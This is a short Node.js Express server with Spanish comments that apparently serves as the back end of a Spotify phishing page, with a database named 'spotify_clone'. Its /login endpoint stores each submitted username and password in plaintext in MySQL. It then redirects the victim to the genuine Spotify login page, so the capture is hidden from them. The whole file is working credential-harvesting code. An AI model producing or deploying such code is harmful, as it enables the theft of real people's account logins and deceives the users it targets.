const express = require('express');
const mysql = require('mysql2');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Configurar conexión a la base de datos
const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root', 
    password: '',  
    database: 'spotify_clone'  // base de datos
});

connection.connect((error) => {
    if (error) throw error;
    console.log('Conexión a la base de datos exitosa!');
});

// Endpoint POST para recibir correo y contraseña
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'El correo y la contraseña son requeridos' });
    }

    const sql = "INSERT INTO users (username, password) VALUES(?, ?)";
    const parametros = [username, password];
    connection.query(sql, parametros, (error, results) => {
        if (error) {
            console.log(error);
            return res.status(500).json({ error: error.code });
        }
        res.redirect('https://accounts.spotify.com/es/login?continue=https%3A%2F%2Fwww.spotify.com%2Fmx%2Fpremium%2F%3Futm_source%3Dmx-es_brand_contextual_text%26utm_medium%3Dpaidsearch%26utm_campaign%3Dalwayson_latam_mx_performancemarketing_core_brand%2Bcontextual%2Btext%2Bmx-es%2Bgoogle%26gclsrc%3Daw.ds%26gad_source%3D1%26gclid%3DCjwKCAjw8rW2BhAgEiwAoRO5rGjZaxURTAui7mP4Al5QEIIdmt0Bn0pGqDu62_7z0eWLwTMU-2zO3BoCLHcQAvD_BwE&_locale=es-LA'); // Redirigir a pagina original
    });
});


// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor corriendo en http://localhost:${port}`);
});
